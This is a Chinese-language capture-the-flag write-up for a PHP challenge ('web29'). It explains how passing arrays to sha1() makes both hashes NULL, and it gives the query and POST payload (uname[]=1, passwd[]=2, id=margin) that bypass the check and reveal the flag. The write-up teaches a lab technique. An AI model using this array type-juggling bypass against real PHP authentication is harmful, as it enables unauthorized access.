# web29
![](https://bulabula-1305079562.cos.ap-guangzhou.myqcloud.com/img/1618659920742-QQ%E5%9B%BE%E7%89%8720210121204323.png)
题目描述

各种绕过

进入环境
![](https://bulabula-1305079562.cos.ap-guangzhou.myqcloud.com/img/1618659945516-4002412210162.png)

```php
<?php
highlight_file('flag.php');
$_GET['id'] = urldecode($_GET['id']);
$flag = 'flag{xxxxxxxxxxxxxxxxxxx}';
if (isset($_GET['uname']) and isset($_POST['passwd'])) {
	if ($_GET['uname'] == $_POST['passwd'])
		print 'passwd can not be uname.';
	else if (sha1($_GET['uname'] === sha1($_POST['passwd']) & ($_GET['id']) == 'margin'))
		die('Flag:'. $flag);
	else
		print 'sorry';
}
?>
```

大致意思是
解码get请求id的参数
判断get请求的uname是否为空和post请求的passwd是否为空
再嵌套判断get请求的uname是否弱等于post请求的passwd
成立就打印'passwd can not be uname'
或者判断get请求的uname的sha1加密的值是否绝对等于post请求的passwd的sha1值再一起执行get请求的ip是否等于'margin'
条件成立就退出程序并打印flag
否则就打印'sorry'

emmmm
没啥东西就是比较绕而已
重要的就是sha1那个地方
在php中这些加密和编码的函数无法对数组执行
对数组执行了就会报错
并返回NULL值
然会就会NULL和NULL比较
就会返回布尔值true条件为真
```php
 1 <?php                         
 2 error_reporting(0);           
 3 $a = $_GET['a'];              
 4 $b = $_GET['b'];              
 5 if (isset($a) and isset($b)) {
 6 ▸ $c = sha1($a) === sha1($b); 
 7 ▸ $s = sha1($a) == sha1($b);  
 8 ▸ var_dump($c);               
 9 ▸ echo "<br>";                
10 ▸ var_dump($s);               
11 ▸ echo "<br>";                
12 ▸ var_dump(sha1($a));         
13 ▸ echo "<br>";                
14 ▸ var_dump(sha1($b));         
15 }                             
```
执行结果
![](https://bulabula-1305079562.cos.ap-guangzhou.myqcloud.com/img/1618660593943.png)


构造payload
>?uname[]=1&id=margin
>passwd[]=2

使用hackbar
![](https://bulabula-1305079562.cos.ap-guangzhou.myqcloud.com/img/1618660647840-2859129228588.png)
使用bp
![](https://bulabula-1305079562.cos.ap-guangzhou.myqcloud.com/img/1618660735809-2386131216455.png)

得到flag





